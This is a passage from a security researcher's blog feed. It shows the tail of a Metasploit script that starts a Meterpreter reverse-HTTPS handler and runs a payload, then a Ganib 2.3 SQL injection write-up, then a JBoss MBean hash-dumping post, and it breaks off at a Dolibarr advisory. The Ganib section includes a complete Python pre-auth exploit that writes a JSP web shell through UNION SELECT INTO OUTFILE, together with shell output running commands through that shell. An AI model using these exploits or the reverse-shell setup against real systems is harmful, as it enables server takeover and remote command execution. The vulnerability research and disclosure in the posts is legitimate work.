</span><span class='line'>use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Spawn the handler if needed
</span><span class='line'>#
</span><span class='line'>aborted = false
</span><span class='line'>begin
</span><span class='line'>
</span><span class='line'>  mh = nil
</span><span class='line'>  payload_name = 'windows/meterpreter/reverse_https'
</span><span class='line'>  if (use_handler)
</span><span class='line'>      mh = framework.modules.create("exploit/multi/handler")
</span><span class='line'>      mh.datastore['LPORT'] = lport
</span><span class='line'>      mh.datastore['LHOST'] = lhost
</span><span class='line'>      mh.datastore['PAYLOAD'] = payload_name
</span><span class='line'>      mh.datastore['ExitOnSession'] = false
</span><span class='line'>      mh.datastore['EXITFUNC'] = 'process'
</span><span class='line'>      mh.exploit_simple(
</span><span class='line'>        'LocalInput'     =&gt; session.user_input,
</span><span class='line'>        'LocalOutput'    =&gt; session.user_output,
</span><span class='line'>        'Payload'        =&gt; payload_name,
</span><span class='line'>        'RunAsJob'       =&gt; true)
</span><span class='line'>      # It takes a little time for the resources to get set up, so sleep for
</span><span class='line'>      # a bit to make sure the exploit is fully working.  Without this,
</span><span class='line'>      # mod.get_resource doesn't exist when we need it.
</span><span class='line'>      select(nil, nil, nil, 0.5)
</span><span class='line'>      if framework.jobs[mh.job_id.to_s].nil?
</span><span class='line'>        raise RuntimeError, "Failed to start multi/handler - is it already running?"
</span><span class='line'>      end
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    # Generate our command and payload
</span><span class='line'>    cmd = generate(lhost, lport, sport)
</span><span class='line'>
</span><span class='line'>    # start http service
</span><span class='line'>    start_http_service(sport)
</span><span class='line'>
</span><span class='line'>    sleep 2 # give it a sec to startup
</span><span class='line'>
</span><span class='line'>    # execute command
</span><span class='line'>    session.run_cmd(cmd)
</span><span class='line'>
</span><span class='line'>    if not @server.state
</span><span class='line'>        # wait...
</span><span class='line'>        wait_payload
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>rescue ::Interrupt
</span><span class='line'>  # TODO: cleanup partial uploads!
</span><span class='line'>  aborted = true
</span><span class='line'>rescue =&gt; e
</span><span class='line'>  print_error("Error: #{e}")
</span><span class='line'>  aborted = true
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Stop the job
</span><span class='line'>#
</span><span class='line'>if (use_handler)
</span><span class='line'>  Thread.new do
</span><span class='line'>    if not aborted
</span><span class='line'>      # Wait up to 10 seconds for the session to come in..
</span><span class='line'>      select(nil, nil, nil, 10)
</span><span class='line'>    end
</span><span class='line'>    framework.jobs.stop_job(mh.job_id)
</span><span class='line'>  end
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>




<h3>Update 09/06/2014</h3>


<p>Tom Sellers submitted a PR on 05/29 that implements the above <a href="https://github.com/rapid7/metasploit-framework/pull/3401">nicely</a>.  It appears to support a large swath of platforms, but only a couple support no-disk-write methods, namely the Powershell method.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[introduction]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/02/introduction/"/>
    <updated>2014-03-02T21:51:11-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/02/introduction</id>
    <content type="html"><![CDATA[<p>This isn&rsquo;t a real introduction post, just a note that I&rsquo;m migrating from Google Blogger to Github Pages with Octopress.  So far it&rsquo;s great.  I&rsquo;m going to be slowly migrating all posts over from Blogger into here, though I may skip a few early posts that aren&rsquo;t as interesting.</p>

<p>Hopefully it provides me with the functionality that I&rsquo;ve been looking for.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
    <updated>2014-02-24T21:03:07-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>

<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>String theme = request.getParameter("theme");
</span><span class='line'>User user = (User) pageContext.getAttribute("user", PageContext.SESSION_SCOPE);
</span><span class='line'>if( user != null && user.getID() != null ) {
</span><span class='line'>    DBBean db = new DBBean();
</span><span class='line'>    
</span><span class='line'>    try {
</span><span class='line'>        String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
</span><span class='line'>        db.prepareStatement(query);
</span><span class='line'>        db.executePrepared();
</span><span class='line'>    } finally {
</span><span class='line'>        db.release();
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s obvious where the flaw is.</p>

<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>

<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Grab parameters from Login form
</span><span class='line'>String secure = request.getParameter ("secure");
</span><span class='line'>String username = request.getParameter ("J_USERNAME");
</span><span class='line'>username = username == null ? u_name : username;
</span><span class='line'>String password = request.getParameter ("J_PASSWORD");
</span><span class='line'>password = password == null ? pwd : password;
</span><span class='line'>String userDomain = request.getParameter("userDomain");
</span><span class='line'>
</span><span class='line'>[...]
</span><span class='line'>
</span><span class='line'>else 
</span><span class='line'>    loginManager.createLoginContext(username, password, userDomain);</span></code></pre></td></tr></table></div></figure>


<p>And the request, for reference:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /LoginProcessing.jsp HTTP/1.1
</span><span class='line'>Host: 192.168.1.219:8080
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://192.168.1.219:8080/
</span><span class='line'>Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; _sid=; _styp=; JSPRootURL=; cookies=true
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 109
</span><span class='line'>
</span><span class='line'>theAction=submit&J_USERNAME=bob%40bob.com&J_PASSWORD=password&language=en&remember_checkbox=on&userDomain=1000</span></code></pre></td></tr></table></div></figure>


<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>try
</span><span class='line'>{
</span><span class='line'>    domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
</span><span class='line'>    domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
</span><span class='line'>    statusCode = LoginStatusCode.SUCCESS;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>

<p><img class="center" src="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg"></p>

<p>Note that, so far, none of the provided input has yet to be sanitized.</p>

<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private DomainAuthenticator(String domainID, String username, String clearTextPassword)
</span><span class='line'>  throws DomainException
</span><span class='line'>{
</span><span class='line'>  try
</span><span class='line'>  {
</span><span class='line'>    UserDomain domain = new UserDomain();
</span><span class='line'>    domain.setID(domainID);
</span><span class='line'>    domain.load();
</span><span class='line'>    setDomain(domain);
</span><span class='line'>
</span><span class='line'>    setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> public void load()
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    DBBean db = new DBBean();
</span><span class='line'>    try
</span><span class='line'>    {
</span><span class='line'>      load(db);
</span><span class='line'>    } finally {
</span><span class='line'>      db.release();
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  public void load(DBBean db)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    loadProperties(db);
</span><span class='line'>
</span><span class='line'>    loadUsers(db);
</span><span class='line'>
</span><span class='line'>    loadSupportedConfigurations(db);
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> public void loadUsers(DBBean db)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    if (this.domainID == null) {
</span><span class='line'>      throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    if (this.userCollection == null) {
</span><span class='line'>      this.userCollection = new DomainUserCollection();
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    this.userCollection.setDomainID(getID());
</span><span class='line'>    this.userCollection.load(db);
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> protected void load(DBBean dbean)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();
</span><span class='line'>
</span><span class='line'>    if (this.domainID == null) {
</span><span class='line'>      throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>  [...]
</span><span class='line'>
</span><span class='line'>  dbean.executeQuery(qstrLoadUsersForDomain);</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>

<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
</span><span class='line'>[!] Dropping ./cmd.jsp on 192.168.1.64...
</span><span class='line'>[!] Dropped at /wjdll.jsp
</span><span class='line'>root@jali:~/exploits# python -c 'import requests; print requests.get("http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd").content'
</span><span class='line'>
</span><span class='line'>/var/www/ganib/tomcat/bin
</span><span class='line'>
</span><span class='line'>    1    2    3
</span><span class='line'>
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>

<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit title: Ganib 2.0 SQLi
</span><span class='line'># Date: 02/02/2014
</span><span class='line'># Exploit author: drone (@dronesec)
</span><span class='line'># More information:
</span><span class='line'># Vendor homepage: http://www.ganib.com/
</span><span class='line'># Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
</span><span class='line'># Version: &lt;= 2.3
</span><span class='line'># Fixed in: 2.4
</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3
</span><span class='line'>
</span><span class='line'>from argparse import ArgumentParser
</span><span class='line'>import sys
</span><span class='line'>import string
</span><span class='line'>import random
</span><span class='line'>import requests
</span><span class='line'>
</span><span class='line'>""" Ganib 2.0 preauth SQLi PoC
</span><span class='line'>    @dronesec
</span><span class='line'>"""
</span><span class='line'>
</span><span class='line'>def loadJSP(options):
</span><span class='line'>    data = ''
</span><span class='line'>
</span><span class='line'>    try:
</span><span class='line'>        with open(options.jsp) as f:
</span><span class='line'>            for line in f.readlines():
</span><span class='line'>                data += line.replace("\"", "\\\"").replace('\n', '')
</span><span class='line'>    except Exception, e:
</span><span class='line'>        print e
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    return data
</span><span class='line'>
</span><span class='line'>def run(options):
</span><span class='line'>    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)
</span><span class='line'>
</span><span class='line'>    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
</span><span class='line'>
</span><span class='line'>    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
</span><span class='line'>    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)
</span><span class='line'>
</span><span class='line'>    data = { "theAction" : "submit",
</span><span class='line'>             "J_USERNAME" : "test",
</span><span class='line'>             "J_PASSWORD" : "test",
</span><span class='line'>             "language" : "en",
</span><span class='line'>             "remember_checkbox" : "on",
</span><span class='line'>             "userDomain" : exploit
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    res = requests.post(url, data=data)
</span><span class='line'>    if res.status_code is 200:
</span><span class='line'>        print '[!] Dropped at /{0}.jsp'.format(shell)
</span><span class='line'>    else:
</span><span class='line'>        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>def parse():
</span><span class='line'>    parser = ArgumentParser()
</span><span class='line'>    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
</span><span class='line'>                        required=True)
</span><span class='line'>    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
</span><span class='line'>                        action='store', default='/var/www/ganib')
</span><span class='line'>    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')
</span><span class='line'>
</span><span class='line'>    options = parser.parse_args()
</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
</span><span class='line'>    return options
</span><span class='line'>
</span><span class='line'>if __name__ == "__main__":
</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fetching JBoss MBean method hashes]]></title>
    <link href="http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes/"/>
    <updated>2014-01-26T00:24:19-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes</id>
    <content type="html"><![CDATA[<p>Matasano published <a href="http://www.matasano.com/research/OWASP3011_Luca.pdf">one</a> of <a href="https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now">two</a> canonical papers on JBoss exploitation.  While working on a fresh new tool, I came across the JMXInvokerServlet technique, which uses serialized Java requests to deploy to remote MBeans.  This uses a specific object hash to route the JMX request to the correct MBean; in our case, the gold is jboss.jmx:name=Invoker.</p>

<p>In this paper, Matasano provides the hash for JBoss 4.0.3SP1, but does not list any others, nor show how it derived this.  After perusing the code, however, I found it to be quite simple, and have developed a simple method for fetching hashes of not only the Invoker MBean, but any listed in the JBoss registry.</p>

<p>To extract these values, we simply deploy a WAR file that dumps the entirety of the Registry, which is used for hash lookups when routing requests.  This can can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;%@ page import="org.jboss.system.Registry"%&gt;
</span><span class='line'>&lt;%@ page import="java.io.*"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Map"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Iterator"%&gt;
</span><span class='line'>&lt;%
</span><span class='line'>    Iterator it = Registry.entries.entrySet().iterator();
</span><span class='line'>    while (it.hasNext()){
</span><span class='line'>        Map.Entry pairs = (Map.Entry)it.next();
</span><span class='line'>        out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
</span><span class='line'>        it.remove();
</span><span class='line'>    }
</span><span class='line'>%&gt;</span></code></pre></td></tr></table></div></figure>


<p>When deployed and executed on my local 4.0.5.GA JBoss server, we get:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_hash.jpg"></p>

<p>With this, we&rsquo;ve fetched the hash for the Invoker MBean as well as every other invokable MBean in the registry.  This value appears to be common across all 3.x and 4.x JBoss instances.  However, when run against JBoss 5.x/6.x instances, the following is returned:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_hash_6x.jpg"></p>

<p>This change is due to the way look-ups are performed in 5.x; instead of the key being an Integer (hash), the key is now an Object, as shown below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public static Map&lt;Object, Object&gt; entries = new ConcurrentHashMap&lt;Object, Object&gt;();</span></code></pre></td></tr></table></div></figure>


<p>To further enumerate this, we can iterate over the class methods and pull all of their hashes and hash codes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;%@ page import="java.io.*"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Map"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Iterator"%&gt;
</span><span class='line'>&lt;%@ page import="java.lang.reflect.Method"%&gt;
</span><span class='line'>&lt;%@ page import="org.jboss.system.Registry"%&gt;
</span><span class='line'>&lt;%@ page import="javax.management.ObjectName"%&gt;
</span><span class='line'>&lt;%@ page import="org.jboss.invocation.MarshalledInvocation"%&gt;
</span><span class='line'>&lt;%
</span><span class='line'>    Iterator it = Registry.entries.entrySet().iterator();
</span><span class='line'>    while (it.hasNext()){
</span><span class='line'>        Map.Entry pairs = (Map.Entry)it.next();
</span><span class='line'>        out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
</span><span class='line'>
</span><span class='line'>        // check for ObjectName
</span><span class='line'>        if (pairs.getKey() instanceof ObjectName){
</span><span class='line'>            Long hash;
</span><span class='line'>            Method[] methods = pairs.getValue().getClass().getMethods();
</span><span class='line'>            for (int m = 0; m &lt; methods.length; ++m){
</span><span class='line'>                Method method = methods[m];
</span><span class='line'>                hash = new Long(MarshalledInvocation.calculateHash(method));
</span><span class='line'>                out.println("Method: " + method + "  Hash: " + hash + " (" + method.hashCode() + ")" + "&lt;br/&gt;");
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        out.println("Key class: " + pairs.getKey().getClass() + "&lt;br/&gt;");
</span><span class='line'>        it.remove();
</span><span class='line'>    }
</span><span class='line'>%&gt;</span></code></pre></td></tr></table></div></figure>


<p>Which gives us:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_6x_methods.jpg"></p>

<p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>

<p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dolibarr 3.4.0 - Multiple Vulnerabilities]]></title>
    <link href="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/"/>
    <updated>2013-10-14T22:13:15-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities</id>
    <content type="html"><![CDATA[<p><a href="http://www.dolibarr.org/">Dolibarr</a> is an open source, enterprise-grade ERP/CRM application developed in PHP.  The latest stable release, 3.4.0, is vulnerable to a host of remotely exploitable post and pre auth vulnerabilities, along with several seriously mind-bending security/architecture choices.  These vulnerabilities and issues were privately disclosed to the vendor, and the SQLi was patched in version 3.4.1.  However, their sanitization methods were not fixed, and no mention was made on a future patch.  Other SQLi vectors are likely.</p>

<p>There are multiple SQL injections that lead to a compromise of the availability/integrity of the database or web server.  The scenario and context of the vulnerabilities are rather interesting, as multiple blacklisting techniques are used by Dolibarr in an attempt to mitigate malicious queries slipping through; nevertheless, as we know, blacklisting never works.  No parameterized queries are to be found in source.</p>

<p>The following is included in each page and used for &ldquo;sanitization&rdquo; <code>main.inc.php</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
